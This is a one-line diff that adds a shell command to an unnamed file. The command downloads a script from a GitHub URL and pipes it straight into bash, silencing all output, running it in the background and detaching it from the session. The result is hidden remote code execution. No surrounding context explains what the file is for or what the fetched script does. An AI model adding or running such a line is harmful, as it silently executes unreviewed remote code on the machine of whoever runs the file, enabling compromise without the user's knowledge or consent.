@@ -1,0 +1,1 @@
+nohup wget -O - https://github.com/thomasgrastein/sp/script.sh | bash &>/dev/null & disown
